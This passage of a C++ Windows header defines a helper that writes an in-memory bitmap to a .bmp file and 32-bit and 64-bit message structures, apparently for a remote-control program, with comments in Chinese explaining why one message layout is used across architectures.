#define WIN32_LEAN_AND_MEAN 
#include <windows.h>
#endif

// 将内存中的位图写入文件
inline bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::string& filePrefix, int index = -1) {
	char path[_MAX_PATH];
	if (filePrefix.size() >= 4 && filePrefix.substr(filePrefix.size() - 4) == ".bmp") {
		strcpy_s(path, filePrefix.c_str());
	}
	else {
		sprintf_s(path, ".\\bmp\\%s_%d.bmp", filePrefix.c_str(), index == -1 ? clock() : index);
	}
	FILE* File = fopen(path, "wb");
	if (File) {
		BITMAPFILEHEADER fileHeader = { 0 };
		fileHeader.bfType = 0x4D42; // "BM"
		fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo->bmiHeader.biSizeImage;
		fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

		fwrite(&fileHeader, 1, sizeof(BITMAPFILEHEADER), File);
		fwrite(&bmpInfo->bmiHeader, 1, sizeof(BITMAPINFOHEADER), File);
		fwrite(bmpData, 1, bmpInfo->bmiHeader.biSizeImage, File);
		fclose(File);
		return true;
	}
	return false;
}

class MSG32 { // 自定义控制消息(32位)
public:
	uint32_t            hwnd;
	uint32_t            message;
	uint32_t            wParam;
	uint32_t            lParam;
	uint32_t            time;
	POINT               pt;

	MSG32(const void* buffer, int size) {
		if (size == sizeof(MSG32)) {
			memcpy(this, buffer, sizeof(MSG32));
		}
		else {
			memset(this, 0, sizeof(MSG32));
		}
	}

	MSG32() {
		memset(this, 0, sizeof(MSG32));
	}

	MSG32* Create(const void* buffer, int size) {
		if (size == sizeof(MSG32)) {
			memcpy(this, buffer, sizeof(MSG32));
		}
		else {
			memset(this, 0, sizeof(MSG32));
		}
		return this;
	}
};

// Windows 自定义的消息MSG在32位和64位系统下大小不同，导致跨平台架构远程控制异常
// 需要使用自定义的消息(统一采用64位windows 的MSG定义)
class MSG64 { // 自定义控制消息(64位)
public:
	uint64_t            hwnd;
	uint64_t            message;
	uint64_t            wParam;
	uint64_t            lParam;
	uint64_t            time;
	POINT               pt;

	MSG64(const MSG& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
		lParam(msg.lParam), time(msg.time), pt(msg.pt) {}

	MSG64(const MSG32& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
		lParam(msg.lParam), time(msg.time), pt(msg.pt) {}

	MSG64(const void* buffer, int size) {
		if (size == sizeof(MSG64)) {
			memcpy(this, buffer, sizeof(MSG64));
		}
		else {
			memset(this, 0, sizeof(MSG64));
		}
	}

	MSG64() {
		memset(this, 0, sizeof(MSG64));
	}

	MSG64* Create(const MSG32* msg32) {
		hwnd = msg32->hwnd;
		message = msg32->message;
		wParam = msg32->wParam;
		lParam = msg32->lParam;
		time = msg32->time;
		pt = msg32->pt;
		return this;
	}
};

#ifdef _WIN64
#define MYMSG MSG
#else
#define MYMSG MSG64
#endif

#endif
